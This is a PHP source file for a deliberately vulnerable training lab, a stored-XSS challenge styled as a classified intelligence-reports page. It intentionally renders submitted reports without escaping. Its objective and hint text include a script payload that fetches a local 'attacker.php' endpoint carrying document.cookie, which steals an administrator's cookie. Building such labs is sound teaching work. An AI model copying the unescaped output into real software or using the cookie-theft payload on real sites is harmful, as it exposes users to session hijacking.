<?php

namespace Labs\XSS\Challenges;

use App\Core\BaseChallenge;
use App\Core\Session;
use App\Core\Database;

class Level2Stored extends BaseChallenge
{
  private array $reports = [];
  private string $newReport = '';
  private string $message = '';
  private bool $solved = false;

  public function handle(): void
  {
    // Check if solved via attacker callback
    if (Session::get('xss_lvl2_solved') === true) {
      $this->solved = true;
    }

    // Load existing reports from the military simulation DB
    $db = Database::getInstance('labs'); // connects to php_security_labs_challenges
    $sql = "SELECT id, agent_id, report, reviewed_by_admin, created_at FROM reports ORDER BY created_at DESC";
    $stmt = $db->query($sql);
    $this->reports = $stmt->fetchAll();

    // Handle new report submission (vulnerable to stored XSS)
    if ($this->isPost() && isset($_POST['report'])) {
      $this->newReport = $_POST['report'];
      // ⚠️ VULNERABILITY: directly inserts user input without escaping
      $insertSql = "INSERT INTO reports (agent_id, report, reviewed_by_admin) VALUES (:agent_id, :report, 0)";
      $db->query($insertSql, [
        'agent_id' => $_SESSION['user_id'] ?? 1,
        'report' => $this->newReport
      ]);
      $this->message = "Report submitted for review.";
      // Reload reports
      $stmt = $db->query($sql);
      $this->reports = $stmt->fetchAll();
    }
  }

  public function render(): void
  {
    // No shared header/sidebar – full military standalone layout
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CLASSIFIED | Intelligence Reports</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
  body {
    font-family: 'Inter', system-ui, sans-serif;
  }

  .data-font {
    font-family: 'JetBrains Mono', 'Fira Code', monospace;
    font-size: 0.85rem;
    letter-spacing: -0.01em;
  }

  .section-title {
    letter-spacing: 0.05em;
    text-transform: uppercase;
    font-weight: 600;
    font-size: 0.7rem;
  }
  </style>
</head>

<body class="bg-slate-900 text-slate-200">
  <div class="max-w-6xl mx-auto py-8 px-4">
    <!-- Header -->
    <div class="border-b border-slate-700 pb-4 mb-6">
      <div class="flex justify-between items-center">
        <div>
          <div class="flex items-center gap-3">
            <i class="fas fa-file-alt text-amber-400 text-xl"></i>
            <h1 class="text-xl font-bold tracking-wider uppercase text-slate-100">§ INTELLIGENCE REPORTS</h1>
          </div>
          <p class="text-slate-400 text-sm mt-1 data-font">Stored XSS – Persistent payload injection</p>
        </div>
        <div class="bg-red-950/50 px-3 py-1 rounded-sm border border-red-800/50">
          <span class="text-red-400 text-xs uppercase tracking-wider">CLASSIFIED // LEVEL 2</span>
        </div>
      </div>
    </div>

    <!-- Mission Objective (amber tactical) -->
    <div class="bg-amber-950/30 border-l-4 border-amber-500 p-4 mb-6">
      <div class="flex items-start gap-3">
        <i class="fas fa-bullhorn text-amber-400 mt-0.5"></i>
        <div>
          <p class="font-semibold text-amber-200 uppercase text-sm tracking-wider">Objective</p>
          <p class="text-slate-300 text-sm">Inject a JavaScript payload into a report that will execute when an
            administrator reviews it. Use the <span
              class="data-font bg-slate-800 px-1 rounded">?page=xss_admin_reports</span> endpoint to simulate admin
            review.</p>
          <p class="text-xs text-slate-400 mt-1 data-font">Payload example: <span
              class="bg-slate-800 px-1 rounded">&lt;script&gt;fetch('http://localhost/public/attacker.php?cookie='+document.cookie)&lt;/script&gt;</span>
          </p>
        </div>
      </div>
    </div>

    <!-- Submit new report (vulnerable form) -->
    <div class="bg-slate-800/50 border border-slate-700 rounded-sm p-5 mb-8">
      <h2 class="section-title text-slate-300 mb-3 flex items-center gap-2"><i
          class="fas fa-pen-alt text-amber-400 text-xs"></i> Submit intelligence report</h2>
      <form method="POST" class="space-y-4">
        <div>
          <textarea name="report" rows="4"
            class="w-full bg-slate-900 border border-slate-600 rounded-sm p-3 text-slate-200 data-font text-sm focus:ring-1 focus:ring-amber-500 focus:border-amber-500"
            placeholder="Write your report... (HTML/JS will be stored as is)"></textarea>
        </div>
        <button type="submit"
          class="bg-amber-700 hover:bg-amber-600 text-white px-5 py-2 rounded-sm text-sm uppercase tracking-wider transition flex items-center gap-2">
          <i class="fas fa-upload"></i> Submit report
        </button>
      </form>
      <?php if ($this->message): ?>
      <div class="mt-3 text-green-400 text-sm data-font"><?= htmlspecialchars($this->message) ?></div>
      <?php endif; ?>
    </div>

    <!-- Stored Reports Table (vulnerable output) -->
    <div class="bg-slate-800/30 border border-slate-700 rounded-sm overflow-hidden">
      <div class="bg-slate-800 px-5 py-3 border-b border-slate-700">
        <h2 class="section-title text-slate-300 flex items-center gap-2"><i
            class="fas fa-database text-amber-400 text-xs"></i> PENDING REVIEW (ALL REPORTS)</h2>
      </div>
      <div class="overflow-x-auto">
        <table class="w-full text-sm">
          <thead class="bg-slate-800/80 text-slate-300 text-xs uppercase tracking-wider">
            <tr>
              <th class="px-5 py-3 text-left">ID</th>
              <th class="px-5 py-3 text-left">Agent ID</th>
              <th class="px-5 py-3 text-left">Report</th>
              <th class="px-5 py-3 text-left">Reviewed</th>
              <th class="px-5 py-3 text-left">Date</th>
            </tr>
          </thead>
          <tbody class="divide-y divide-slate-700/50">
            <?php foreach ($this->reports as $report): ?>
            <tr class="hover:bg-slate-800/40">
              <td class="px-5 py-3 data-font text-slate-300"><?= $report['id'] ?></td>
              <td class="px-5 py-3 data-font text-slate-300"><?= $report['agent_id'] ?? 'N/A' ?></td>
              <td class="px-5 py-3 data-font text-slate-200">
                <!-- ⚠️ VULNERABLE: raw stored XSS payload will execute -->
                <?= $report['report'] ?>
              </td>
              <td class="px-5 py-3">
                <?= $report['reviewed_by_admin'] ? '<span class="text-emerald-400 text-xs">✓ Reviewed</span>' : '<span class="text-amber-400 text-xs">Pending</span>' ?>
              </td>
              <td class="px-5 py-3 data-font text-slate-400 text-xs">
                <?= date('Y-m-d H:i', strtotime($report['created_at'])) ?></td>
            </tr>
            <?php endforeach; ?>
          </tbody>
        </table>
      </div>
    </div>

    <!-- Hint / Debug (collapsible) -->
    <details class="mt-8 bg-slate-800/20 rounded-sm p-3">
      <summary class="cursor-pointer text-xs text-slate-400 uppercase tracking-wider">📡 Field Manual (Hint)</summary>
      <div class="mt-2 pl-3 border-l border-slate-600 text-xs text-slate-400 data-font">
        <p>The report content is stored exactly as submitted and later displayed without escaping. Inject a script that
          sends the admin's cookie to the attacker endpoint. Then view the "Admin Review Panel" (simulated) to trigger
          the payload.</p>
      </div>
    </details>

    <!-- Success message if solved -->
    <?php if ($this->solved): ?>
    <div
      class="fixed bottom-5 right-5 bg-emerald-900/80 backdrop-blur-sm border border-emerald-500 rounded-sm p-3 flex items-center gap-2">
      <i class="fas fa-check-circle text-emerald-400"></i>
      <span class="text-sm data-font text-emerald-200">CHALLENGE COMPLETE – COOKIE EXFILTRATED</span>
    </div>
    <?php endif; ?>
  </div>
</body>

</html>
<?php
  }

  public function validate(): bool
  {
    $solved = Session::get('xss_lvl2_solved') === true;
    if ($solved) {
      $this->markCompleted('xss', 'lvl2');
    }
    return $solved;
  }
}